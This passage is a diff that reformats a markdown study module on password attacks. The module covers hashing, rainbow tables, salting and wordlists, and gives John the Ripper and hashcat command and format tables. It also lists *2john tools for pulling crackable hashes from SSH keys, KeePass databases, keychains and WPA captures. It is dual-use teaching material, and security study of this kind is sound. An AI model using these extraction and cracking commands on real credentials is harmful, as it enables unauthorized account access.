@@ -1,7 +1,8 @@
-# 🔐 Password Attacks  
-*Passwords remain the fragile seals guarding the gateways of corporate realms. When these wards are weak or neglected, the shadows may crack them open with ease. This module unveils the secrets of password storage, retrieval, and the arcane art of cracking or leveraging hashes—guiding the seeker through the labyrinth of authentication’s frailties.*
+# 🔐 Password Attacks
 
-> *“Even the strongest lock may yield to the patient whisper of ancient incantations.”*
+_Passwords remain the fragile seals guarding the gateways of corporate realms. When these wards are weak or neglected, the shadows may crack them open with ease. This module unveils the secrets of password storage, retrieval, and the arcane art of cracking or leveraging hashes—guiding the seeker through the labyrinth of authentication’s frailties._
+
+> _“Even the strongest lock may yield to the patient whisper of ancient incantations.”_
 
 <details>
 <summary><h1>💡 Introduction</h1></summary>
@@ -11,17 +12,13 @@ Passwords are commonly hashed when stored, in order to provide some protection i
 Hash functions are cryptographically designed to be one-way operations, making it computationally infeasible to derive the original input from its hashed output. When malicious actors attempt to reverse this process, it constitutes password cracking. Common methodologies include:
 
 1. Rainbow Table Attacks
-
-    * Leveraging precomputed hash chains for rapid lookups
+   - Leveraging precomputed hash chains for rapid lookups
 
 2. Dictionary Attacks
-
-    * Testing known wordlists and common password variations
+   - Testing known wordlists and common password variations
 
 3. Brute-Force Attacks
-
-    * Systematic trial of all possible character combinations (typically last-resort)
-
+   - Systematic trial of all possible character combinations (typically last-resort)
 
 <details>
 <summary><h2>Generate a hash</h2></summary>
@@ -198,19 +195,19 @@ echo -n "password123!" | gzip -1 | tail -c 8 | hexdump -n4 -e '"%08x\n"'
 
 Rainbow tables represent extensive pre-generated databases that map plaintext inputs to their corresponding hash outputs for specific cryptographic algorithms. These tables enable rapid password recovery through direct hash lookup.
 
-| Password    | MD5 Hash                           |
-|-------------|------------------------------------|
-| 123456      | e10adc3949ba59abbe56e057f20f883e |
-| 12345       | 827ccb0eea8a706c4c34a16891f84e7b |
-| 123456789   | 25f9e794323b453885f5181f1b624d0b |
-| password    | 5f4dcc3b5aa765d61d8327deb882cf99 |
-| iloveyou    | f25a2fc72690b780b2a14e140ef6a9e0 |
-| princess    | 8afa847f50a716e64932d995c8e7435a |
-| 1234567     | fcea920f7412b5da7be0cf42b8c93759 |
-| rockyou     | f806fc5a2a0d5ba2471600758452799c |
-| 12345678    | 25d55ad283aa400af464c76d713c07ad |
-| abc123      | e99a18c428cb38d5f260853678922e03 |
-| ...  | ...                        |
+| Password  | MD5 Hash                         |
+| --------- | -------------------------------- |
+| 123456    | e10adc3949ba59abbe56e057f20f883e |
+| 12345     | 827ccb0eea8a706c4c34a16891f84e7b |
+| 123456789 | 25f9e794323b453885f5181f1b624d0b |
+| password  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| iloveyou  | f25a2fc72690b780b2a14e140ef6a9e0 |
+| princess  | 8afa847f50a716e64932d995c8e7435a |
+| 1234567   | fcea920f7412b5da7be0cf42b8c93759 |
+| rockyou   | f806fc5a2a0d5ba2471600758452799c |
+| 12345678  | 25d55ad283aa400af464c76d713c07ad |
+| abc123    | e99a18c428cb38d5f260853678922e03 |
+| ...       | ...                              |
 
 > Because rainbow tables are such a powerful attack, salting is used.
 
@@ -221,7 +218,7 @@ Rainbow tables represent extensive pre-generated databases that map plaintext in
 
 A salt, in cryptographic terms, is a random sequence of bytes added to a password before it is hashed.
 
-For example, if the salt *PWN0M1C0N_* is prepended to the same password, the MD5 hash would now be as follows:
+For example, if the salt _PWN0M1C0N\__ is prepended to the same password, the MD5 hash would now be as follows:
 
 <table width="100%">
 <tr>
@@ -256,9 +253,9 @@ ded0e91215d34046aca709995c794045
 
 **Why use a Salt?**
 
-* Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.
+- Prevents Identical Hashes: Without a salt, the same password always produces the same hash. Salts ensure uniqueness, even if two users have the same password.
 
-* Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.
+- Defeats Rainbow Tables: Precomputed hash tables (rainbow tables) become useless because each salt requires a separate lookup table.
 
 **How Salts Break Rainbow Tables**
 
@@ -274,23 +271,22 @@ Dictionary attacks (or wordlist attacks) represent one of the most effective pas
 
 **Key Characteristics**
 
-* **High Efficiency:** Targets common passwords first, maximizing success rate per attempt
+- **High Efficiency:** Targets common passwords first, maximizing success rate per attempt
 
-* **Time Optimization:** Critical for engagements with limited testing windows
+- **Time Optimization:** Critical for engagements with limited testing windows
 
-* **Customization:** Wordlists can be tailored to specific industries, regions, or targets
+- **Customization:** Wordlists can be tailored to specific industries, regions, or targets
 
 **Common Wordlist Resources**
 
-* [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches
+- [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt): Contains millions of real passwords from historical breaches
 
-* [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:
+- [SecLists](https://github.com/danielmiessler/SecLists): Comprehensive security testing collection including:
+  - Common credentials
 
-    * Common credentials
+  - Default passwords
 
-    * Default passwords
-
-    * Pattern-based variations
+  - Pattern-based variations
 
 </details>
 
@@ -311,69 +307,69 @@ Tool used for cracking passwords through various attacks including brute-force a
 <details>
 <summary><h3>JtR FOrmats</h3></summary>
 
-| Hash Format           | Example Command                          | Description |
-|-----------------------|-----------------------------------------|-------------|
-| afs                   | `john --format=afs [...] <HASH_FILE>`    | AFS (Andrew File System) password hashes |
-| bfegg                 | `john --format=bfegg [...] <HASH_FILE>`  | bfegg hashes used in Eggdrop IRC bots |
-| bf                    | `john --format=bf [...] <HASH_FILE>`     | Blowfish-based crypt(3) hashes |
-| bsdi                  | `john --format=bsdi [...] <HASH_FILE>`   | BSDi crypt(3) hashes |
-| crypt(3)              | `john --format=crypt [...] <HASH_FILE>`  | Traditional Unix crypt(3) hashes |
-| des                   | `john --format=des [...] <HASH_FILE>`    | Traditional DES-based crypt(3) hashes |
-| dmd5                  | `john --format=dmd5 [...] <HASH_FILE>`   | DMD5 (Dragonfly BSD MD5) password hashes |
-| dominosec             | `john --format=dominosec [...] <HASH_FILE>` | IBM Lotus Domino 6/7 password hashes |
-| EPiServer SID hashes  | `john --format=episerver [...] <HASH_FILE>` | EPiServer SID (Security Identifier) password hashes |
-| hdaa                  | `john --format=hdaa [...] <HASH_FILE>`   | hdaa password hashes used in Openwall GNU/Linux |
-| hmac-md5              | `john --format=hmac-md5 [...] <HASH_FILE>` | hmac-md5 password hashes |
-| hmailserver           | `john --format=hmailserver [...] <HASH_FILE>` | hmailserver password hashes |
-| ipb2                  | `john --format=ipb2 [...] <HASH_FILE>`   | Invision Power Board 2 password hashes |
-| krb4                  | `john --format=krb4 [...] <HASH_FILE>`   | Kerberos 4 password hashes |
-| krb5                  | `john --format=krb5 [...] <HASH_FILE>`   | Kerberos 5 password hashes |
-| LM                    | `john --format=LM [...] <HASH_FILE>`     | LM (Lan Manager) password hashes |
-| lotus5                | `john --format=lotus5 [...] <HASH_FILE>` | Lotus Notes/Domino 5 password hashes |
-| mscash                | `john --format=mscash [...] <HASH_FILE>` | MS Cache password hashes |
-| mscash2               | `john --format=mscash2 [...] <HASH_FILE>` | MS Cache v2 password hashes |
-| mschapv2              | `john --format=mschapv2 [...] <HASH_FILE>` | MS CHAP v2 password hashes |
-| mskrb5                | `john --format=mskrb5 [...] <HASH_FILE>` | MS Kerberos 5 password hashes |
-| mssql05               | `john --format=mssql05 [...] <HASH_FILE>` | MS SQL 2005 password hashes |
-| mssql                 | `john --format=mssql [...] <HASH_FILE>`  | MS SQL password hashes |
-| mysql-fast            | `john --format=mysql-fast [...] <HASH_FILE>` | MySQL fast password hashes |
-| mysql                 | `john --format=mysql [...] <HASH_FILE>`  | MySQL password hashes |
-| mysql-sha1            | `john --format=mysql-sha1 [...] <HASH_FILE>` | MySQL SHA1 password hashes |
-| NETLM                 | `john --format=netlm [...] <HASH_FILE>`  | NETLM (NT LAN Manager) password hashes |
-| NETLMv2               | `john --format=netlmv2 [...] <HASH_FILE>` | NETLMv2 (NT LAN Manager version 2) password hashes |
-| NETNTLM               | `john --format=netntlm [...] <HASH_FILE>` | NETNTLM (NT LAN Manager) password hashes |
-| NETNTLMv2             | `john --format=netntlmv2 [...] <HASH_FILE>` | NETNTLMv2 (NT LAN Manager version 2) password hashes |
-| NEThalfLM             | `john --format=nethalflm [...] <HASH_FILE>` | NEThalfLM (NT LAN Manager) password hashes |
-| md5ns                 | `john --format=md5ns [...] <HASH_FILE>`  | md5ns (MD5 namespace) password hashes |
-| nsldap                | `john --format=nsldap [...] <HASH_FILE>` | nsldap (OpenLDAP SHA) password hashes |
-| ssha                  | `john --format=ssha [...] <HASH_FILE>`   | ssha (Salted SHA) password hashes |
-| NT                    | `john --format=nt [...] <HASH_FILE>`     | NT (Windows NT) password hashes |
-| openssha              | `john --format=openssha [...] <HASH_FILE>` | OPENSSH private key password hashes |
-| oracle11              | `john --format=oracle11 [...] <HASH_FILE>` | Oracle 11 password hashes |
-| oracle                | `john --format=oracle [...] <HASH_FILE>` | Oracle password hashes |
-| pdf                   | `john --format=pdf [...] <HASH_FILE>`    | PDF (Portable Document Format) password hashes |
-| phpass-md5            | `john --format=phpass-md5 [...] <HASH_FILE>` | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
-| phps                  | `john --format=phps [...] <HASH_FILE>`   | PHPS password hashes |
-| pix-md5               | `john --format=pix-md5 [...] <HASH_FILE>` | Cisco PIX MD5 password hashes |
-| po                    | `john --format=po [...] <HASH_FILE>`     | Po (Sybase SQL Anywhere) password hashes |
-| rar                   | `john --format=rar [...] <HASH_FILE>`    | RAR (WinRAR) password hashes |
-| raw-md4               | `john --format=raw-md4 [...] <HASH_FILE>` | Raw MD4 password hashes |
-| raw-md5               | `john --format=raw-md5 [...] <HASH_FILE>` | Raw MD5 password hashes |
-| raw-md5-unicode       | `john --format=raw-md5-unicode [...] <HASH_FILE>` | Raw MD5 Unicode password hashes |
-| raw-sha1              | `john --format=raw-sha1 [...] <HASH_FILE>` | Raw SHA1 password hashes |
-| raw-sha224            | `john --format=raw-sha224 [...] <HASH_FILE>` | Raw SHA224 password hashes |
-| raw-sha256            | `john --format=raw-sha256 [...] <HASH_FILE>` | Raw SHA256 password hashes |
-| raw-sha384            | `john --format=raw-sha384 [...] <HASH_FILE>` | Raw SHA384 password hashes |
-| raw-sha512            | `john --format=raw-sha512 [...] <HASH_FILE>` | Raw SHA512 password hashes |
-| salted-sha            | `john --format=salted-sha [...] <HASH_FILE>` | Salted SHA password hashes |
-| sapb                  | `john --format=sapb [...] <HASH_FILE>`   | SAP CODVN B (BCODE) password hashes |
-| sapg                  | `john --format=sapg [...] <HASH_FILE>`   | SAP CODVN G (PASSCODE) password hashes |
-| sha1-gen              | `john --format=sha1-gen [...] <HASH_FILE>` | Generic SHA1 password hashes |
-| skey                  | `john --format=skey [...] <HASH_FILE>`   | S/Key (One-time password) hashes |
-| ssh                   | `john --format=ssh [...] <HASH_FILE>`    | SSH (Secure Shell) password hashes |
-| sybasease             | `john --format=sybasease [...] <HASH_FILE>` | Sybase ASE password hashes |
-| xsha                  | `john --format=xsha [...] <HASH_FILE>`   | xsha (Extended SHA) password hashes |
-| zip                   | `john --format=zip [...] <HASH_FILE>`    | ZIP (WinZip) password hashes |
+| Hash Format          | Example Command                                   | Description                                                          |
+| -------------------- | ------------------------------------------------- | -------------------------------------------------------------------- |
+| afs                  | `john --format=afs [...] <HASH_FILE>`             | AFS (Andrew File System) password hashes                             |
+| bfegg                | `john --format=bfegg [...] <HASH_FILE>`           | bfegg hashes used in Eggdrop IRC bots                                |
+| bf                   | `john --format=bf [...] <HASH_FILE>`              | Blowfish-based crypt(3) hashes                                       |
+| bsdi                 | `john --format=bsdi [...] <HASH_FILE>`            | BSDi crypt(3) hashes                                                 |
+| crypt(3)             | `john --format=crypt [...] <HASH_FILE>`           | Traditional Unix crypt(3) hashes                                     |
+| des                  | `john --format=des [...] <HASH_FILE>`             | Traditional DES-based crypt(3) hashes                                |
+| dmd5                 | `john --format=dmd5 [...] <HASH_FILE>`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
+| dominosec            | `john --format=dominosec [...] <HASH_FILE>`       | IBM Lotus Domino 6/7 password hashes                                 |
+| EPiServer SID hashes | `john --format=episerver [...] <HASH_FILE>`       | EPiServer SID (Security Identifier) password hashes                  |
+| hdaa                 | `john --format=hdaa [...] <HASH_FILE>`            | hdaa password hashes used in Openwall GNU/Linux                      |
+| hmac-md5             | `john --format=hmac-md5 [...] <HASH_FILE>`        | hmac-md5 password hashes                                             |
+| hmailserver          | `john --format=hmailserver [...] <HASH_FILE>`     | hmailserver password hashes                                          |
+| ipb2                 | `john --format=ipb2 [...] <HASH_FILE>`            | Invision Power Board 2 password hashes                               |
+| krb4                 | `john --format=krb4 [...] <HASH_FILE>`            | Kerberos 4 password hashes                                           |
+| krb5                 | `john --format=krb5 [...] <HASH_FILE>`            | Kerberos 5 password hashes                                           |
+| LM                   | `john --format=LM [...] <HASH_FILE>`              | LM (Lan Manager) password hashes                                     |
+| lotus5               | `john --format=lotus5 [...] <HASH_FILE>`          | Lotus Notes/Domino 5 password hashes                                 |
+| mscash               | `john --format=mscash [...] <HASH_FILE>`          | MS Cache password hashes                                             |
+| mscash2              | `john --format=mscash2 [...] <HASH_FILE>`         | MS Cache v2 password hashes                                          |
+| mschapv2             | `john --format=mschapv2 [...] <HASH_FILE>`        | MS CHAP v2 password hashes                                           |
+| mskrb5               | `john --format=mskrb5 [...] <HASH_FILE>`          | MS Kerberos 5 password hashes                                        |
+| mssql05              | `john --format=mssql05 [...] <HASH_FILE>`         | MS SQL 2005 password hashes                                          |
+| mssql                | `john --format=mssql [...] <HASH_FILE>`           | MS SQL password hashes                                               |
+| mysql-fast           | `john --format=mysql-fast [...] <HASH_FILE>`      | MySQL fast password hashes                                           |
+| mysql                | `john --format=mysql [...] <HASH_FILE>`           | MySQL password hashes                                                |
+| mysql-sha1           | `john --format=mysql-sha1 [...] <HASH_FILE>`      | MySQL SHA1 password hashes                                           |
+| NETLM                | `john --format=netlm [...] <HASH_FILE>`           | NETLM (NT LAN Manager) password hashes                               |
+| NETLMv2              | `john --format=netlmv2 [...] <HASH_FILE>`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
+| NETNTLM              | `john --format=netntlm [...] <HASH_FILE>`         | NETNTLM (NT LAN Manager) password hashes                             |
+| NETNTLMv2            | `john --format=netntlmv2 [...] <HASH_FILE>`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
+| NEThalfLM            | `john --format=nethalflm [...] <HASH_FILE>`       | NEThalfLM (NT LAN Manager) password hashes                           |
+| md5ns                | `john --format=md5ns [...] <HASH_FILE>`           | md5ns (MD5 namespace) password hashes                                |
+| nsldap               | `john --format=nsldap [...] <HASH_FILE>`          | nsldap (OpenLDAP SHA) password hashes                                |
+| ssha                 | `john --format=ssha [...] <HASH_FILE>`            | ssha (Salted SHA) password hashes                                    |
+| NT                   | `john --format=nt [...] <HASH_FILE>`              | NT (Windows NT) password hashes                                      |
+| openssha             | `john --format=openssha [...] <HASH_FILE>`        | OPENSSH private key password hashes                                  |
+| oracle11             | `john --format=oracle11 [...] <HASH_FILE>`        | Oracle 11 password hashes                                            |
+| oracle               | `john --format=oracle [...] <HASH_FILE>`          | Oracle password hashes                                               |
+| pdf                  | `john --format=pdf [...] <HASH_FILE>`             | PDF (Portable Document Format) password hashes                       |
+| phpass-md5           | `john --format=phpass-md5 [...] <HASH_FILE>`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
+| phps                 | `john --format=phps [...] <HASH_FILE>`            | PHPS password hashes                                                 |
+| pix-md5              | `john --format=pix-md5 [...] <HASH_FILE>`         | Cisco PIX MD5 password hashes                                        |
+| po                   | `john --format=po [...] <HASH_FILE>`              | Po (Sybase SQL Anywhere) password hashes                             |
+| rar                  | `john --format=rar [...] <HASH_FILE>`             | RAR (WinRAR) password hashes                                         |
+| raw-md4              | `john --format=raw-md4 [...] <HASH_FILE>`         | Raw MD4 password hashes                                              |
+| raw-md5              | `john --format=raw-md5 [...] <HASH_FILE>`         | Raw MD5 password hashes                                              |
+| raw-md5-unicode      | `john --format=raw-md5-unicode [...] <HASH_FILE>` | Raw MD5 Unicode password hashes                                      |
+| raw-sha1             | `john --format=raw-sha1 [...] <HASH_FILE>`        | Raw SHA1 password hashes                                             |
+| raw-sha224           | `john --format=raw-sha224 [...] <HASH_FILE>`      | Raw SHA224 password hashes                                           |
+| raw-sha256           | `john --format=raw-sha256 [...] <HASH_FILE>`      | Raw SHA256 password hashes                                           |
+| raw-sha384           | `john --format=raw-sha384 [...] <HASH_FILE>`      | Raw SHA384 password hashes                                           |
+| raw-sha512           | `john --format=raw-sha512 [...] <HASH_FILE>`      | Raw SHA512 password hashes                                           |
+| salted-sha           | `john --format=salted-sha [...] <HASH_FILE>`      | Salted SHA password hashes                                           |
+| sapb                 | `john --format=sapb [...] <HASH_FILE>`            | SAP CODVN B (BCODE) password hashes                                  |
+| sapg                 | `john --format=sapg [...] <HASH_FILE>`            | SAP CODVN G (PASSCODE) password hashes                               |
+| sha1-gen             | `john --format=sha1-gen [...] <HASH_FILE>`        | Generic SHA1 password hashes                                         |
+| skey                 | `john --format=skey [...] <HASH_FILE>`            | S/Key (One-time password) hashes                                     |
+| ssh                  | `john --format=ssh [...] <HASH_FILE>`             | SSH (Secure Shell) password hashes                                   |
+| sybasease            | `john --format=sybasease [...] <HASH_FILE>`       | Sybase ASE password hashes                                           |
+| xsha                 | `john --format=xsha [...] <HASH_FILE>`            | xsha (Extended SHA) password hashes                                  |
+| zip                  | `john --format=zip [...] <HASH_FILE>`             | ZIP (WinZip) password hashes                                         |
 
 </details>
 
@@ -635,22 +631,22 @@ John the Ripper includes specialized utilities for extracting hashes from encryp
 
 Some of the tools included with JtR are:
 
-| Tool                     | Example Usage                     | Description |
-|--------------------------|-----------------------------------|-------------|
-| `pdf2john`               | `pdf2john file.pdf > hash.txt`    | Extracts password hashes from PDF files for John |
-| `ssh2john`               | `ssh2john id_rsa > hash.txt`      | Converts SSH private keys to John format |
-| `mscash2john`            | `mscash2john cache.dat > hash.txt`| Extracts MS Cash password hashes |
-| `keychain2john`          | `keychain2john login.keychain > hash.txt` | Processes macOS keychain files |
-| `rar2john`               | `rar2john archive.rar > hash.txt` | Extracts RAR archive passwords |
-| `pfx2john`               | `pfx2john cert.pfx > hash.txt`    | Converts PKCS#12 files for cracking |
-| `truecrypt_volume2john`  | `truecrypt_volume2john volume.tc > hash.txt` | Extracts TrueCrypt volume passwords |
-| `keepass2john`           | `keepass2john database.kdbx > hash.txt` | Extracts KeePass database credentials |
-| `vncpcap2john`           | `vncpcap2john capture.pcap > hash.txt` | Extracts VNC passwords from PCAP files |
-| `putty2john`             | `putty2john putty_key.ppk > hash.txt` | Converts PuTTY private keys |
-| `zip2john`               | `zip2john archive.zip > hash.txt` | Extracts ZIP archive passwords |
-| `hccap2john`             | `hccap2john capture.cap > hash.txt` | Converts WPA handshakes for cracking |
-| `office2john`            | `office2john document.docx > hash.txt` | Extracts MS Office document passwords |
-| `wpa2john`               | `wpa2john capture.pcap > hash.txt` | Alternative WPA handshake converter |
+| Tool                    | Example Usage                                | Description                                      |
+| ----------------------- | -------------------------------------------- | ------------------------------------------------ |
+| `pdf2john`              | `pdf2john file.pdf > hash.txt`               | Extracts password hashes from PDF files for John |
+| `ssh2john`              | `ssh2john id_rsa > hash.txt`                 | Converts SSH private keys to John format         |
+| `mscash2john`           | `mscash2john cache.dat > hash.txt`           | Extracts MS Cash password hashes                 |
+| `keychain2john`         | `keychain2john login.keychain > hash.txt`    | Processes macOS keychain files                   |
+| `rar2john`              | `rar2john archive.rar > hash.txt`            | Extracts RAR archive passwords                   |
+| `pfx2john`              | `pfx2john cert.pfx > hash.txt`               | Converts PKCS#12 files for cracking              |
+| `truecrypt_volume2john` | `truecrypt_volume2john volume.tc > hash.txt` | Extracts TrueCrypt volume passwords              |
+| `keepass2john`          | `keepass2john database.kdbx > hash.txt`      | Extracts KeePass database credentials            |
+| `vncpcap2john`          | `vncpcap2john capture.pcap > hash.txt`       | Extracts VNC passwords from PCAP files           |
+| `putty2john`            | `putty2john putty_key.ppk > hash.txt`        | Converts PuTTY private keys                      |
+| `zip2john`              | `zip2john archive.zip > hash.txt`            | Extracts ZIP archive passwords                   |
+| `hccap2john`            | `hccap2john capture.cap > hash.txt`          | Converts WPA handshakes for cracking             |
+| `office2john`           | `office2john document.docx > hash.txt`       | Extracts MS Office document passwords            |
+| `wpa2john`              | `wpa2john capture.pcap > hash.txt`           | Alternative WPA handshake converter              |
 
 An even larger collection can be found:
 
@@ -913,506 +909,506 @@ hashcat --attack-mode 3 --hash-type 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l
 <details>
 <summary><h3>Hashcat types</h3></summary>
 
-|   # | Name                                                                 | Category                              |
-|-----:|----------------------------------------------------------------------|---------------------------------------|
-|  900 | MD4                                                                  | Raw Hash                              |
-|    0 | MD5                                                                  | Raw Hash                              |
-|  100 | SHA1                                                                 | Raw Hash                              |
-| 1300 | SHA2-224                                                             | Raw Hash                              |
-| 1400 | SHA2-256                                                             | Raw Hash                              |
-| 10800 | SHA2-384                                                             | Raw Hash                              |
-| 1700 | SHA2-512                                                             | Raw Hash                              |
-| 17300 | SHA3-224                                                             | Raw Hash                              |
-| 17400 | SHA3-256                                                             | Raw Hash                              |
-| 17500 | SHA3-384                                                             | Raw Hash                              |
-| 17600 | SHA3-512                                                             | Raw Hash                              |
-| 6000 | RIPEMD-160                                                           | Raw Hash                              |
-|  600 | BLAKE2b-512                                                          | Raw Hash                              |
-| 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian                     | Raw Hash                              |
-| 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian                     | Raw Hash                              |
-| 6900 | GOST R 34.11-94                                                      | Raw Hash                              |
-| 17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                                 | Raw Hash                              |
-| 5100 | Half MD5                                                             | Raw Hash                              |
-| 17700 | Keccak-224                                                           | Raw Hash                              |
-| 17800 | Keccak-256                                                           | Raw Hash                              |
-| 17900 | Keccak-384                                                           | Raw Hash                              |
-| 18000 | Keccak-512                                                           | Raw Hash                              |
-| 6100 | Whirlpool                                                            | Raw Hash                              |
-| 10100 | SipHash                                                              | Raw Hash                              |
-|   70 | md5(utf16le($pass))                                                  | Raw Hash                              |
-|  170 | sha1(utf16le($pass))                                                 | Raw Hash                              |
-| 1470 | sha256(utf16le($pass))                                               | Raw Hash                              |
-| 10870 | sha384(utf16le($pass))                                               | Raw Hash                              |
-| 1770 | sha512(utf16le($pass))                                               | Raw Hash                              |
-|  610 | BLAKE2b-512($pass.$salt)                                             | Raw Hash salted and/or iterated       |
-|  620 | BLAKE2b-512($salt.$pass)                                             | Raw Hash salted and/or iterated       |
-|   10 | md5($pass.$salt)                                                     | Raw Hash salted and/or iterated       |
-|   20 | md5($salt.$pass)                                                     | Raw Hash salted and/or iterated       |
-| 3800 | md5($salt.$pass.$salt)                                               | Raw Hash salted and/or iterated       |
-| 3710 | md5($salt.md5($pass))                                                | Raw Hash salted and/or iterated       |
-| 4110 | md5($salt.md5($pass.$salt))                                          | Raw Hash salted and/or iterated       |
-| 4010 | md5($salt.md5($salt.$pass))                                          | Raw Hash salted and/or iterated       |
-| 21300 | md5($salt.sha1($salt.$pass))                                         | Raw Hash salted and/or iterated       |
-|   40 | md5($salt.utf16le($pass))                                            | Raw Hash salted and/or iterated       |
-| 2600 | md5(md5($pass))                                                      | Raw Hash salted and/or iterated       |
-| 3910 | md5(md5($pass).md5($salt))                                           | Raw Hash salted and/or iterated       |
-| 3500 | md5(md5(md5($pass)))                                                 | Raw Hash salted and/or iterated       |
-| 4400 | md5(sha1($pass))                                                     | Raw Hash salted and/or iterated       |
-| 4410 | md5(sha1($pass).$salt)                                               | Raw Hash salted and/or iterated       |
-| 20900 | md5(sha1($pass).md5($pass).sha1($pass))                              | Raw Hash salted and/or iterated       |
-| 21200 | md5(sha1($salt).md5($pass))                                          | Raw Hash salted and/or iterated       |
-| 4300 | md5(strtoupper(md5($pass)))                                          | Raw Hash salted and/or iterated       |
-|   30 | md5(utf16le($pass).$salt)                                            | Raw Hash salted and/or iterated       |
-|  110 | sha1($pass.$salt)                                                    | Raw Hash salted and/or iterated       |
-|  120 | sha1($salt.$pass)                                                    | Raw Hash salted and/or iterated       |
-| 4900 | sha1($salt.$pass.$salt)                                              | Raw Hash salted and/or iterated       |
-| 4520 | sha1($salt.sha1($pass))                                              | Raw Hash salted and/or iterated       |
-| 24300 | sha1($salt.sha1($pass.$salt))                                        | Raw Hash salted and/or iterated       |
-|  140 | sha1($salt.utf16le($pass))                                           | Raw Hash salted and/or iterated       |
-| 19300 | sha1($salt1.$pass.$salt2)                                            | Raw Hash salted and/or iterated       |
-| 14400 | sha1(CX)                                                             | Raw Hash salted and/or iterated       |
-| 4700 | sha1(md5($pass))                                                     | Raw Hash salted and/or iterated       |
-| 4710 | sha1(md5($pass).$salt)                                               | Raw Hash salted and/or iterated       |
-| 21100 | sha1(md5($pass.$salt))                                               | Raw Hash salted and/or iterated       |
-| 18500 | sha1(md5(md5($pass)))                                                | Raw Hash salted and/or iterated       |
-| 4500 | sha1(sha1($pass))                                                    | Raw Hash salted and/or iterated       |
-| 4510 | sha1(sha1($pass).$salt)                                              | Raw Hash salted and/or iterated       |
-| 5000 | sha1(sha1($salt.$pass.$salt))                                        | Raw Hash salted and/or iterated       |
-|  130 | sha1(utf16le($pass).$salt)                                           | Raw Hash salted and/or iterated       |
-| 1410 | sha256($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
-| 1420 | sha256($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
-| 22300 | sha256($salt.$pass.$salt)                                            | Raw Hash salted and/or iterated       |
-| 20720 | sha256($salt.sha256($pass))                                          | Raw Hash salted and/or iterated       |
-| 21420 | sha256($salt.sha256_bin($pass))                                      | Raw Hash salted and/or iterated       |
-| 1440 | sha256($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
-| 20800 | sha256(md5($pass))                                                   | Raw Hash salted and/or iterated       |
-| 20710 | sha256(sha256($pass).$salt)                                          | Raw Hash salted and/or iterated       |
-| 21400 | sha256(sha256_bin($pass))                                            | Raw Hash salted and/or iterated       |
-| 1430 | sha256(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
-| 10810 | sha384($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
-| 10820 | sha384($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
-| 10840 | sha384($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
-| 10830 | sha384(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
-| 1710 | sha512($pass.$salt)                                                  | Raw Hash salted and/or iterated       |
-| 1720 | sha512($salt.$pass)                                                  | Raw Hash salted and/or iterated       |
-| 1740 | sha512($salt.utf16le($pass))                                         | Raw Hash salted and/or iterated       |
-| 1730 | sha512(utf16le($pass).$salt)                                         | Raw Hash salted and/or iterated       |
-|   50 | HMAC-MD5 (key = $pass)                                              | Raw Hash authenticated                |
-|   60 | HMAC-MD5 (key = $salt)                                              | Raw Hash authenticated                |
-|  150 | HMAC-SHA1 (key = $pass)                                             | Raw Hash authenticated                |
-|  160 | HMAC-SHA1 (key = $salt)                                             | Raw Hash authenticated                |
-| 1450 | HMAC-SHA256 (key = $pass)                                           | Raw Hash authenticated                |
-| 1460 | HMAC-SHA256 (key = $salt)                                           | Raw Hash authenticated                |
-| 1750 | HMAC-SHA512 (key = $pass)                                           | Raw Hash authenticated                |
-| 1760 | HMAC-SHA512 (key = $salt)                                           | Raw Hash authenticated                |
-| 11750 | HMAC-Streebog-256 (key = $pass), big-endian                          | Raw Hash authenticated                |
-| 11760 | HMAC-Streebog-256 (key = $salt), big-endian                          | Raw Hash authenticated                |
-| 11850 | HMAC-Streebog-512 (key = $pass), big-endian                          | Raw Hash authenticated                |
-| 11860 | HMAC-Streebog-512 (key = $salt), big-endian                          | Raw Hash authenticated                |
-| 28700 | Amazon AWS4-HMAC-SHA256                                              | Raw Hash authenticated                |
-| 11500 | CRC32                                                                | Raw Checksum                          |
-| 27900 | CRC32C                                                               | Raw Checksum                          |
-| 28000 | CRC64Jones                                                           | Raw Checksum                          |
-| 18700 | Java Object hashCode()                                               | Raw Checksum                          |
-| 25700 | MurmurHash                                                           | Raw Checksum                          |
-| 27800 | MurmurHash3                                                          | Raw Checksum                          |
-| 14100 | 3DES (PT = $salt, key = $pass)                                      | Raw Cipher, Known-plaintext attack    |
-| 14000 | DES (PT = $salt, key = $pass)                                       | Raw Cipher, Known-plaintext attack    |
-| 26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
-| 26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
-| 26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                         | Raw Cipher, Known-plaintext attack    |
-| 15400 | ChaCha20                                                             | Raw Cipher, Known-plaintext attack    |
-| 14500 | Linux Kernel Crypto API (2.4)                                        | Raw Cipher, Known-plaintext attack    |
-| 14900 | Skip32 (PT = $salt, key = $pass)                                    | Raw Cipher, Known-plaintext attack    |
-| 11900 | PBKDF2-HMAC-MD5                                                      | Generic KDF                           |
-| 12000 | PBKDF2-HMAC-SHA1                                                     | Generic KDF                           |
-| 10900 | PBKDF2-HMAC-SHA256                                                   | Generic KDF                           |
